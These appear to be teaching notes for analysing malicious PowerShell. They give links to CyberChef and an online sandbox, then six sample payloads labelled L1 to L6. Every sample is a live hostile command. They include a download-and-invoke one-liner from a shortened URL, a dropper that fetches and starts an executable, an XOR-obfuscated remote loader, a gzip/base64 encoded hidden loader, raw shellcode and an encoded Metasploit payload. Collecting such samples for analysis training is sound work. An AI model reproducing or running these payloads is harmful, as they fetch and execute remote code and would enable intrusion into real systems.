Useful Links:

Cyber Chef:
https://gchq.github.io/CyberChef/

Any.run online sandbox:
https://app.any.run/


Referenced Samples:

L1 - Example of fileless execution/download and invoke code.
	
	powershell.exe -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3l36xdO')‚Äù


L2 - 2 Stage traditional dropper style command

	(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")
	
L3 - Obfuscated fileless execution with powershell. Download and invoke.

	$WC=NeW-OBJect SyStEM.NEt.WeBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERS.AdD('User-Agent',$u);$wC.PROXY = [SYSTEM.Net.WeBREQuesT]::DEFAulTWEBPROXy;$Wc.PRoXy.CReDEnTIalS = [SystEm.NET.CREdEnTiaLCAche]::DeFAuLTNETWorkCreDenTiaLS;$K='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';$I=0;[chaR[]]$B=([chAr[]]($Wc.DowNLOAdStrinG("http://192.168.1.1:80/index.asp")))|%{$_-BXOR$K[$I++%$K.LENgTh]};IEX ($B-JOIN'')
	

L4 - Large encoded data section:
	if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJblSlcCA71W+2/aSBD+uZX6P1gVEkYlYBOSKpEi3Zp3gnkZ2wGKqsVew8La69hrXr3+7zcmkMe1uevdSbfCYr0zszvzzTc79pLAEZQH0rLZDXurgeFI3z68f9fDEfYlOcPdrpKXMvyiv720HVIa5969A3GGiKF0I8kTFIZV7mMaTK+vK0kUkUA8vhcaRKA4Jv6MURLLOel3yV6QiJx1Z0viCOmblPlaaDA+w+yotqtgZ0GkMxS4qazNHZw6VjBCRoWc/fIlm5ucqdNC7SHBLJazxi4WxC+4jGVz0vdceuBwFxI5q1Mn4jH3RMGmwXmpYAYx9kgHdlsTnYgFd+NsDoKAX0REEgVSGk5q/yiVszDtRdxBrhuRGJQLrWDNV0TOBAljeek3eXI8fJAEgvoE5IJEPDRItKYOiQtNHLiMDIg3lTtkc4r5V43kl0ag1RNRLg/J+NFLnbsJI4+G2dyPfh7yl4PxOocQ/fcP7z+8907Jf1jX6cu8w+zd5DAn4KPc4zE96N1IwAYdjsOCRzt4zQyjhOSm0iSFfjKdSpn9Q3TFA7txNZzH+bf3UU9GYOL3ul83o9WdCesTi1N3CnbHDGWS7r7Nrd19n4zDVP4246rEowGp7gLsU+dEKvlnCSAeI4fACye1DngoZ48C4lYJI3MsUkzz0uRHs5pPxZOtllDmkgg5kMQYvIL85l4785gmOdsKdOIDcI/vWUiKB1QmJ+0jfXen09N3UMpWGI7jvNRLoJacvGQQzIibl1AQ06MIJYIfptlnd/WECergWJy2m+b+jOfx3AoPYhElDuQUMBgaIXEoZikkealJXaLtDDo/nZ/9KSAVzBgN5rDTGhICKykQhkiZEoGrr1iRKxhEtPyQER90D0VeZ3gOJX2sjAPF8Jy42bc8PpXAI99TjE7gvPAXEm8wLvKSRSMBd0aK9xPV/ptPL66OV95VInLMm3yqsYm2E2llZDZ6t0fbxoHERwAPcEUCoKpH3NdwTC7LhogASPljsUsrCMaoFTDd0VZURRuqtnR4THre4tXP7t3tslmMqtuFh1pxS2/2qv1ms7y+NayyMGotcddrCb12v1waqDkwR2LcQs0hVVaj8j68pXujjdzRtni51/YbRdvul3PXG1U9b/7ZMwbqRZ227UpfU0q4Xa0lbVvbaEo5rtFNs0/N/uq2LmYji2HTK87v1StMt+1oaal85lsKaizOsX0RWo2F7u5GzeKVuS2pnaEJD66GNsFeUbVgPoe10sKp9RG67DlpuGvXV1f9Vb1jVBddq7E1Ouq45ii32/FQY65i9UZ7pPTtsDa0y1ti66WZ2SrPzJXSMcNIt1u7vjlXXbtWchsqm9XHbbIKY3zeaQ9qtYvOcFDGfr06s2Mx9MfV2dDdtC0WGMOBgfcdjPdWMrBcZdYcKaZa282swaBT6igmu9qjusatsu9t10WLOuMhRmhXbg3SmO5NdcwvVTPpFosW8/ndfYkifYMQJdqDVtcemiB3TUwWYGsecBjzdn80IqC/cDS1UrtSS2TRTgHAK40jDSaNOUI1hACfUVjvseKVDXbd2wvV5ShlRr1jY+3OpqRdVEf3yNU/tbVNs5rud2Etq/efFudFGG6jvhkZF8lsp4ZO5WLt+A5KihWVs/EDqveKav/m5mPKaSB1ZnOuvKDnW41Kx1G8wAxoCy3odLvUeVQ/tpMep6mFLD9/U6xIFBAGzRja9akeEWPcSRvboftAU31sdVO4YEyYnpd+OstJT4q55453Wrq+HoOrUNynaiu0STAXi7yyPVcUaF7KtqxAtL8eYoWHO/lpu3zaAFOYXh7BDkfk0mrPPCxn5v8A4fGiWcCf+3cQPq/9hfSXYFXyh9B/WH298I/g/Xfh25gKUDfgpmTksbn/HIUjZ158GqUJAjZ4x5F+mHYTcdaBL6Y/AFNu0WoMCwAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

L5 Shellcode extracted from prior sample:

	/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2hcEQAA6PcAAAAvdm1kQkFNSDhOVGxSN1ZEc0JxZTBld0VPYzA0QWpETW4xeWM2bUI4bUk0NUprMWIyQUg1dWE2dG1lbFZLekpsa3NLREE5NTR4amFDbWstTmZDbTdwLVlnSTRSazNaazVuRVd0bHY0U1EybVRRN2N0Ul9zAFBoV4mfxv/VicZTaAAy4IRTU1NXU1Zo61UuO//VlmoKX2iAMwAAieBqBFBqH1ZodUaehv/VU1NTU1ZoLQYYe//VhcB1CE912ehLAAAAakBoABAAAGgAAEAAU2hYpFPl/9WTU1OJ51doACAAAFNWaBKWieL/1YXAdM+LBwHDhcB15VjDX+h3////dGFwYS5uby1pcC5vcmcAu/C1olZqAFP/1Q==

L6 Common metasploit powershell command payload 

	powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA2ADEAWAA2ADMATwBpAHkAQgBiAC8ASABQADgASwBQAHEAUgBLAHEARABGAGUAagBNAGEASgBzADUAVwBxAFEAUgA2AEsAQQBwAEcASABqACsAaQBtAFUAZwBnAHQAUQBWAHQAQQBhAEUAUwB5AE0ALwAvADcASABsAEMAegBtAFoAMwBrADMAcQBtADYAWQB4AFYAbAAwADMAMgBlAHYALwBQAG8AZwA0AG4ASQBsAFUAbABpADMAeQBGAHEANgBDAEwAcQBhAG8ATABpAHgAQQA4AEQANgByAHAAUwB1AFIAUgBDAG0AVgBCADMAMQBOAGQAcQBaAFoAVQBHAEQAaQBtADIAaQA4AFcAVABoADgAaABUAEYASQBmAE8AawArADIANgBNAFUAbwBTADYAcQAvAEsAeABjAGkATwA3AFMAMQBGAFgAKwA3AHQAKwBHAGsAYgB1AGkAbABHAE4AYQBwADgASwBRAGkAUgBtADgAYQBJAHUAYgBpAG8AWABKAFIAYgBhAFoARABZAEsALwBRAFUAMgBNAFQAZgBvADYAYwB0AEkAcwArAGgAbQA0AEEAaQBlAHMARgBGAGsAUgBCAHUAYgBUADkANAAvAFAASwBGAFQAKwBNAFkAQgBlAFQANABYAHUAOABoAHcAaQBVAEoAMgBpADYAeABqAHgASwBhAG8AYgA1AFIAMAAyAGMAVQBvADYAdgA3ADUAUgBvADUAaABQAHEATAB1AG4AeQBxADkAMwBDADQAdABQAEcASgBMAE8AZAB0ADUAeABrAGMANABnAEsAMwBPAEYATgBDAHgAeQA0ADgAcQBKAHMAUgA5AGcAbABkAC8AZgBQAFAASwByAE8ANABhAGoAegBXAHgAVgAxAHEANAA0AFMAdQBtAG4AbABDADAATABiAHUAWQBsAHgAbABxAE8AOQBNAG8AZABEAEsASQAwAFIAWABWAGQAKwBKAHcAeQBSAGMAawBmAHIAVQBEADUAcgBYADkAWABGAHAAdgBWAFkAYQByAHgANQB0AHIAegBJAG4AegA3AHoASQBCAGoAOAArAGQAcgBLAFEAZQB1AFMAaABxADcAQQBjAEEAVABiAGMARQBjAE4AcQBqAFYAbwBVACsAaABhAFAAagA5AFQAWABWADIAdQBNAE4AQwBEACsARgB0AFgAbABnAEsAQQA0AGoARQB3AFUANwAzADAASABKAGYAVwArAEgAYgBnAFkARwBXAGcARgBiAE4AVQBFAHcAaABkADQAVgBRAGEATQBpAEIARgBKADQANABBADYAMgB3AEoAOAArADMAQwBEADYATQBzAGcAeABiAGcARwBjAGgAZQAvAEsAdgBlAFIAMQBsAEIAMgBCAHYAZABYAG0AZQBpADMAVABFAEEAMQBJAGoARgBUAE8AKwBYAEUAcgA4AEMAaABsAG4AbAB6AEYAQQBmAHUALwBHAFQAOQBtACsAUgBpADQAUABkAFQAZwBqAEcAVgA3ADUAVgAzAFUAdABWAEYARwBIAGsAMgBRAFUAOABFADgASAAyAFQAcQA1AFcATABpADAAVwA1AFIATwBBAFAAUABRAG8AVAB2ACsAUwA3AG8AOQBnAGEAcABZAEkAUgBOAGcAbgBqAHYAQQBpAG4ARgBhAGUASQBlAGYAdwBuAFAAawBlADEAWgA4ADYAawA5AHEARwBnAHgAcABuAHIAeABIAE0ATQB6ADkARwBPAE8AMgBvAHgAQwBYADMAMwBzAFgATABCAFYARQA3AFoAVQArAHcALwBMAFYATQBmAHUAeQBnAHUAegBqACsAdQBCAGcARwB0AC8AQQBBAEoAZQBXAEIAdgBmAGUAZQBjADgAUABSADcATQBVAE0AcgBqAEUAbwA4ADYAbQBjAHkARABlAHkAawBxADYAYwBEADUAQQBvAG4AZABLAG8ARgBvAEkAdQBmADIAYwBTAHQAVAAxADUANQB1ADAAZgBqAE8AQQBmAGkAbgBvAEIAVgBrAEIATABNAGoAOABZAGMAWQAwAGgAWAA1AFUAQgBGAFcAOABEAHYAKwBBADUAcABlAHIAbQBDAE0AawBOAG4ANgBsAE4AcAA1AFcAZgB0AHgAWAB1AFIAeQB6AHkAMgBrADYAUgBHAGoAVgBLAG8AYwA2AGQARwBtAGMAagBHAHkASwAxAFIAWABKAEQANABwAHkATQB1AEoAVwBHADUAcgBQADUAagByAHAAcABpADQAagB0ADIAUQBzADcAaQBIAHAAbAAzAEkARAAyAHAANQBzAE0AQQBLAGkAWgAxAEkATABvAEEAZwAyAFYARwB5AFAARgB0AFgASwBCAFMAbwAvAHEAKwBpADcAcQA1ADYAWAB0AG4ARQA2AHIAdgBZAHMATABiAEcARQBQAEoAZwBhAFEAOQB4AEEAUgAyAEMAaQB4AE0AVQB1AFIATQA3AE4AYgArAG4AUgA5AE0AMwBVAFIARQAzAGsAWQBZAGIAWQBHADYANwBFAEkAUwB0AGoAMwBvAE8AYQBlAEsASwB0AFAATgA5AHAAQgBiAC8AUwA5AG0AbgArAHYAawBXAEIAUQBGAFYAbQBlAFEAMwBoAGcATgBDAFcARABpAGsATgBTAG8AaQBSADgAVAA2AEcAdgBWADIAawArAEoAOQAvACsAWgA5ADIATwBMACsAYwBGAE0AUABrAGEAbgBRAE4ASgBsAEkAUwA2ADYATwBTAG4ASwBwAGEAUgAwAGkAcwB2AGwANwBoAFgATABFAHIAbQBZAEEARwBwAFMASABHADYANwBkAG8ATABhAEwAYgBOAHMAWQAzAFMAMQBlAFoAdgB1ADUARgB4AGQANgArADIANABKACsANgBsAC8AcQA0AHYAVwB2AEQAcwA0AFcAbgB1AEoARgBGAFIAQgBrAGIAVQBOAFIAUgBIAFQATwA5AEgAZgBYAGEAdwBrAHYAVgBiAG8AWgBWAG0AcQBaAHgAYQBYAGIAWQBwAHMAVQBEADMAcwB1AHUASgBLADMAbAAvAEgAegA0ADAAMABtADIAcgA0AFUAYgB5AFgAbwBPADkANQBQAE8AdQBuAHcAagB5AFgAdQBEADYAMQA3AHQAUQBhAG4AdAArADUAeQBUAG4AeQBLADgAdgBzADgAWgB5AEoAawB1AGYAbAB6ADIAcAAxAFoAOABrAFUAawBIAGYAbAAvAGQAZABhAGMAZAAzAFEAbABqAC8AUgA5ADcAegA0AFEARAA0AGIAdAB0AFIAMABNADMAYwBGAGgASQBIAGIAVABSAFQAbgBLAHgASgBiAHAASAB0AEgAZgBMAGgANQBKAFAASgBOAG4AcQBUAFgARgBNAG0AWQBxAFMAWgBnAGEAcwBzAEcANwBvADAAMABGADYAdQBjAC8AQQBKAC8ARABLAGIAZgBZAE4AMQA0AFQARQBQAHUARABFAE4ATABhAGUAVAA3AFAAcQBGAHYANgBpAHIANwBKAHgAZwBNAEoARAA3AGcAOQB5ADgAOABYAHcANQAxAHoASwBIAEoAZQB3AHUAZgBzAEgATgAwAGYAdwBsADMAOQAwAEMAdgA5AFkAQwBUAEEANQBtAHIAaABxAHQAdABuAHQAdwBaAGwATABtAHoARABRAGwANwB6ADkAbwBQAGQAQwB4AFMANgBkAGUAcQA2ADgAcAA0AFkARgBiAHkAKwAxAFkATQBFADMAMwB4AGIAUQBPAEQAYgBNAHgAeAAzAHQANwA1AG4AUwBDAHIATgBSAHYAdQBvAGYATQBIAFMAZgAzAEEANABzADgATgBFAGYAMgB0AHAAWABuAFEAZAB1AFUAMQAvAEoAQgBjAFMASQB5AG0AUQAzAGEAcwBaADMAegBrAGUASwBqAFoAWABkAEYAQwByAGsARABaAGUANABOAE8AaQBLAHMAUgBYAEoAZwBUAGQAUABJAFgAZABDAEwAKwA1AFkAdwBCAEwAMABCAHIANgByAGcAZwAzADAAagBQAFcAeABRAGMAegBTAGMAYQBpADkATwBzADYAcwA0AGUAUwB5AEQASAA2AE4AaAAyAHcAZgBaAHQAMABSAHQAdwByADQAZwBZAG4ATwB5AG0AUgB0AGcAcQBTADQAWQBuAEMAWgA2AEQAZAAxAGkAbwAzAHQAaABmAEQATwAwADkATQBaAGcAegBLAHMAQwBsAC8AMgBHAEoAOQBkADgAWABlAHoAMgB4AGcAMQBuAHoAagBYAGMAMwByAFQAaABxAEcAYgBEAHYAYgBlAHkARABqADkAdQBhAEMATgB6ADAAKwBVAG4AYgBLAFIAYQArAG0ARgA1ADMASAA5AGUAVwBwAHYAYgBrAFkANAAxAEMAKwB6AGgAZABPAHcATwBMAFoARgBWAHAAKwB6AE4AcQBDAGYASgBTAE0AeABZAFcAOABnADIASwBtADgAOABtAC8AMQBuAFYAZQB2AGwAcgBlAGgAaAAwACsAVQBNAHIATQAyAEUAYgBZAGUAMwB4AHMAWgBVADMAeABpADkAbgBxADcAMQBMAFAAMwBtADIAdQBFADYAUABlAHQARQBLAC8AbQB0AHkAQgBuAFAASgBRAE4ATAB2AGIARwB4AEUAVQBEAGYAYgBIAHoAWQBxAEkATABZAFYAUQAzADIAUQBUAE0AbgBnAHkAbQBjADIAYwBLADQAcQAxAHAAZQBsAGcANgBuAEEAMAA0AFgANQA5AFkAawB1ADkAbABhADQANABJAG0AMABvAHoAdQBSAGoAQQBrAFAAQgB4AG4AdAA0AEwAQgB6AGkAVwBMAEgAYwB3AE0AawBPAHQAaQA4AEYARwAvADgAUQAxAHgAcgBrADAATwBHADIARwA1AE8AYwB6AE4AVABXAGUAawBlADkAbABVAE0ARgBTAEIAYgB4AHAARABhACsAeQBxAEUANABrAFQAbABqAE4ASABrAEgAUgBXADcAMwBGAGEAYwB6AHkATwArAHMAYQBtAE0AUgBPADYAdQBpAFkAZQBQAEcARQA4AEcAYwAvAEYAWgAxAGsAVABzADEAQQBBAC8AMgBYAEQAMAB6AGIARwBwAGkAdABiAGYAQwB1AFMAZgAwAGMAOABqAHMALwBhADcATgB4AFAAdgBSAG4AawA0AGcAYQB2AEkAWQA5AGYASQBLAGMAVgBlAE4AWgB5ADAAMQBCAFEAeQA4ADAATwBrAEcAUABKAFkASwBjAHEAUABOAFQATABQAHMAcQBkAFkAUwB5ADYAWQByAEwAbQBvAEUAYQBjAC8AawBSAFIAbAA5AE4AZAA1AHIANQBjAFIANgBrADIAdQA3AEcAOQBqAFoAegB5AFUATwBQAEwASAB2AG8AawBLAEQAdgB5AEcAZgBKAE8AdAB5AEMAdgBaAG8ASQBoADIAMQBMAEcAbQB0AEoAQgBMACsAcAB1AEwAVwBkADMAZAAwAFUASABXADQAVQB4AHoAQwBTAEgANABwADcALwBnADQATAAvAEsAMAB5AG8AMQB4ADQARgBuAFEAbQBhAFgAcgBIAC8ANgBSAE4AVAB6AEEAcQB2AEoANAB2AEwAdwArAE4ANQB0AG4AdAA5AHYAMQBvAGUAUQBGAHIAegBwAHUAaAAzADUAYwBuAGUAZgB0AFAAbABQAGgAcQBZAFYARAB0AE8AbgBtADAATQAzAFEAKwBHAG4AdgBPAFYASgBZAFcAeABkAEIAcABkAFIAcQBGAGYAYwBOAEQAMAArADkAUAAyAEIAcwBVAEIAdwBqAEMASgB3AHEAeAA2AGIAdgBRAGMAeABxAEYAVABEAEYAcwBmAFQARAAwAHcAKwBoADAASABzAGsAZQA0ADAATQBhAHcAYgBGADYALwB1ADIASwBvAFYAMABLAFkAcwBJADQAKwBMAGQAUABWAHEAaAB4AEkAVABoADYAZQA1ADcASQB6ADQAWgBjAHYAYwAzAEMAdgA5AGcAWgBFAEIAUQBVAGUAZQBhADUAUgA3AEsASABKAHMAbQB6AHgAMwAyAEsAWgB5AHEALwBEAHcAbwBkAFIAVAByACsASwBxAHgAVQBEADIAUgB0AEwAMwBtAHIAQwBwAFMAYgBtAGgASAA2AGMAQgBsAHYAMABHAHcAUAB3AGcAOQBMAC8ARABXADAAQgBYAGoAbgBUAHYAVQBKAFgARwB2AFEAKwBYAGsAeQBsACsAcgBWAFMAawBWAGYAVQBtAC8AMwBFAGYANABFAHYARgByAFMAagBiAHMAdgBjAFMANABnAGQAawA2AHQAMQB1AEkAVABQAG0ALwBLACsAcABpADkAdABoAHAATABGAEcAWABWAHAAVQA5ACsAcABLADMAQwBQAFMANQByAFgAOABJADAAVABlADIAbAB4AGUAVgBQAEgAVAA3AFoAdgBWAEcAYgA3AFIAOABaAHYAbABJAEUAYwBCAEMAUAAzADEAUwBCAGMAUQBwAFkAaQBtAE0ARQBLADAAYQBXAFEAZwBoAGoAMgAvAGcAYgA0AHYAWABiAEQAQQB3ADQAQQBBAEEAPQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA

